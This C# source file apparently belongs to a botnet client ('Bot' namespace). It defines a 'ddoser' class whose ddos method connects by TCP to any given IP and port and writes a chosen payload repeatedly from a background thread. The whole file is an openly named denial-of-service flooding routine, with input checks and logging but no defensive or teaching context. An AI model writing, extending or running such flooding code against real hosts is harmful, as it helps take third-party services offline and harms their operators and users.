using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net;
using System.Net.Sockets;

namespace Bot
{
    class ddoser
    {
        public static ddoser getInstance;
        public static void init()
        {
            getInstance = new ddoser();
        }

        public void ddos(string ip, int port, string txtToSend, int timesToSend)
        {
            if (timesToSend <= 0)
            {
                Utils.log("Wrong times to send value!");
                return;
            }

            if (txtToSend == "" || txtToSend == " " || txtToSend == null || txtToSend.Length <= 0)
            {
                Utils.log("Wrong value for text to send!");
                return;
            }

            TcpClient client = new TcpClient();
            try
            {
                client.Connect(ip, port);
            }
            catch (Exception e)
            {
                Utils.log("Cannot connect to server: " + e.Message);
            }

            if (client == null)
            {
                Utils.log("Client is null?!");
                return;
            }

            if (client.Connected && client != null)
            {
                NetworkStream stream = client.GetStream();
                byte[] data = ASCIIEncoding.ASCII.GetBytes(txtToSend);

                new System.Threading.Thread(() =>
                {
                    for (int i = 0; i < timesToSend; i++)
                    {
                        stream.Write(data, 0, data.Length);
                    }
                }).Start();
            }
        }
    }
}
